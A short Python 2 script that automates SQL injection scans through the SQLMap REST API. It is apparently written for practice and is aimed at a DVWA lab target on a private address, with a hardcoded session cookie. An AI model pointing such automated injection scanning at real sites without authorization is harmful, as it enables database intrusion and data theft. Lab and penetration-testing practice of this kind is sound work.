#!/usr/bin/env python
"""
💉 SQLMap Automator
Talks to the SQLMap API to run SQL injection tests automatically!
Using the REST API server: python sqlmapapi.py -s
"""

import requests
import json
import time
import pprint

class SqlMapBot:

    def __init__(self, target_url, options=None):
        self.api_base = "http://127.0.0.1:8775"
        self.target_url = target_url
        self.options = options if options else {}
        print "\n💉 SQLMap Bot Initialized!"
        print "   🎯 Target: " + self.target_url

    def get_new_task(self):
        """Request a new Task ID from server."""
        try:
            resp = requests.get(self.api_base + "/task/new")
            data = resp.json()
            if data.get("success"):
                return data.get("taskid")
        except Exception as e:
            print "   ❌ Error getting task: " + str(e)
        return None

    def start_mission(self):
        """Starts the injection mission!"""
        print "\n🚀 Starting Mission..."

        # 1️⃣ Get Task ID
        task_id = self.get_new_task()
        if not task_id:
            print "   ❌ Could not get Task ID. Is sqlmapapi running?"
            return

        print "   🆔 Task ID: " + str(task_id)

        # 2️⃣ Set Options
        print "   ⚙️  Configuring options..."
        payload = {'url': self.target_url}
        payload.update(self.options)
        
        try:
            resp = requests.post(self.api_base + "/option/" + task_id + "/set", json=payload)
            if not resp.json().get("success"):
                print "   ❌ Failed to set options!"
                return
            
            # 3️⃣ Start Scan
            print "   🔥 Launching Scan..."
            resp = requests.post(self.api_base + "/scan/" + task_id + "/start", json=payload)
            
            if resp.json().get("success"):
                print "   ✅ Scan running! Polling for logs..."
                self.poll_logs(task_id)
            else:
                print "   ❌ Failed to start scan!"

        except Exception as e:
            print "   💥 Exception: " + str(e)

    def poll_logs(self, task_id):
        """Checks the logs periodically."""
        print "\n📜 Polling Logs (This takes time)..."
        
        # Simple wait for demo purposes (real usage would loop checking status)
        wait_time = 30
        print "   ⏳ Waiting " + str(wait_time) + " seconds..."
        time.sleep(wait_time) 
        
        try:
            print "   📡 Fetching Log..."
            resp = requests.get(self.api_base + "/scan/" + task_id + "/log")
            data = resp.json()
            
            print "\n   📊 === SCAN RESULTS ==="
            pp = pprint.PrettyPrinter(indent=4)
            pp.pprint(data)
            print "   ======================="
            
        except Exception as e:
            print "   ❌ Error polling logs: " + str(e)

# 🛠️ Configuration
# Ensure you put valid cookies here if needed!
scan_options = {
    'cookie': 'PHPSESSID=7brq7o2qf68hk94tan3f14atg4; security=low'
}

# 🎯 Target URL (DVWA Example)
target_url = 'http://192.168.250.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit'

if __name__ == "__main__":
    bot = SqlMapBot(target_url, scan_options)
    bot.start_mission()
